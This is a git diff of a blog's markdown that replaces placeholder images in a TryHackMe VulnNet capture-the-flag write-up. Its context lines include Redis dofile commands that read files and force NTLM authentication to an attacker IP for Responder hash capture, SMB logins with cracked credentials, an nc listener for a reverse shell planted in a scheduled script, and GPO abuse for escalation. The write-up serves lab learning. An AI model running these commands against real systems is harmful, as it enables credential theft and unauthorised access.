@@ -64,12 +64,12 @@ A Golden Ticket attack is a type of attack in which an attacker gains access to 
 
 This room on tryhackme is all about active directory and domain controller. So let's begin our machine with Nmap scanning.
 
-![Initial Enumeration](/placeholder.svg?height=400&width=800&text=Nmap+Initial+Scan)
+![enum](/blog-images/vulnet-enum.jpg)
 
 Every domain controller services are up and running which is part of AD DC. But \`Kerberos\` is not running so we can not [AS-REP](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/) roasting the usernames to check if they are valid.
 I ran the Nmap to scan all ports.
 
-![All Ports Scan](/placeholder.svg?height=400&width=800&text=Nmap+All+Ports+Scan)
+![enum](/blog-images/vulnet-nmap-all.jpg)
 
 Here many ports are open so it is always beneficial to check for all ports. RPC and LDAP services are also running, Smb is a very good option to start with and I did the same.
 
@@ -83,12 +83,12 @@ It confirms that no guest and a null session are allowed.
 But my eyes got on to port 6379 (Redis). I was unaware of this but [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) are always a good option to search for anything.
 Redis is a No-sql database that stores information alongside key-value called keyspaces. The version of Redis key-value store 2.8.2402 is vulnerable to ssrf + CRLF.
 
-![Redis Exploitation](/placeholder.svg?height=400&width=800&text=Redis+Exploitation)
+![redis](/blog-images/vulnet-redis.jpg)
 
 Here we can exploit Redis via ssrf, but we must know the path to the windows server files
 \`redis-cli -h 10.10.245.19 eval "dofile('C:\\\\\\Users\\\\\\enterprise-security\\\\\\Desktop\\\\\\users.txt')" 0\`
 
-![Redis Command Execution](/placeholder.svg?height=400&width=800&text=Redis+Command+Execution)
+![redis](/blog-images/vulnet-redis-exp.jpg)
 
 we got the users.txt flag. If we can get any files why not exploit further to get Authenticated user's NTLM hash? If we forge redis to connect back to our attacking machine, maybe users' hashes will be exposed.
 I set up the responder from impacket, when users from the Redis server try to connect to our machine responder will log the hashes.
@@ -97,8 +97,7 @@ I set up the responder from impacket, when users from the Redis server try to co
 
 \`redis-cli -h 10.10.245.19 eval "dofile('//10.9.0.31/test')" 0\`
 
-![Responder Hash Capture](/placeholder.svg?height=400&width=800&text=Responder+Hash+Capture)
-
+![responder](/blog-images/vulnet-responder.jpg)
 Since we got the user enterprise-security hash, we cracked with john the ripper and got the password.
 
 **SMB port 445 enumerations 2nd round**
@@ -106,11 +105,11 @@ Since we got the user enterprise-security hash, we cracked with john the ripper 
 We have now a username and password, so we can enumerate allowed shares on smbserver. I tried to log into enterprise-Share on smb and successfully logged in.
 \`smbmap -H 10.10.155.156 -u enterprise-security -p pass\`
 
-![SMB Enumeration](/placeholder.svg?height=400&width=800&text=SMB+Share+Enumeration)
+![smbmap](/blog-images/vulnet-smbmap.jpg)
 
 \`smbclient //10.10.155.156/enterprise-share -U 'enterprise-security' pass\`
 
-![SMB Client Access](/placeholder.svg?height=400&width=800&text=SMB+Client+Access)
+![smbclient](/blog-images/vulnet-smbclient.jpg)
 
 There is a Powershell script scheduled to run, PurgeIrrelevantData_1826.ps1 with content.
 \`rm -Force C:\\Users\\Public\\Documents\\* -ErrorAction SilentlyContinue\`
@@ -126,7 +125,7 @@ Add this line to the bottom of the script and wait for netcat to catch the shell
 
 \`nc -lvnp 4444\`
 
-![Reverse Shell](/placeholder.svg?height=400&width=800&text=Reverse+Shell+Connection)
+![shell](/blog-images/vulnet-shell.jpg)
 
 Finally, we got reverse shell as enterprise security for the windows server.
 
@@ -134,8 +133,7 @@ Finally, we got reverse shell as enterprise security for the windows server.
 
 When I get the foothold on the machine, I always start with winPEAS.exe and it does give me some useful information which is SeImpersonatePrivilege.
 I collect domain info with bloodhound-python and upload it to the bloodhound for analyzing users, groups, and domains.
-
-![BloodHound Analysis](/placeholder.svg?height=400&width=800&text=BloodHound+Domain+Analysis)
+![bloodhound](/blog-images/vulnet-bloodhound.jpg)
 
 Here is the shortest path to the admin where we will be abusing one of the \`GPO(group policy object)\` on which we can edit users' permission, local groups, memberships, and computer tasks.
 We use \`SharpGPOAbuse.exe\` to escalate our privilege.
@@ -162,8 +160,6 @@ We can access admin via smbclient.
 # Web Application Security Best Practices
 
 Web application security is a critical aspect of web development. Here are some best practices to keep your web applications secure.
-
-![Security Best Practices](/placeholder.svg?height=400&width=800&text=Web+Security+Best+Practices)
 
 ## Input Validation
 
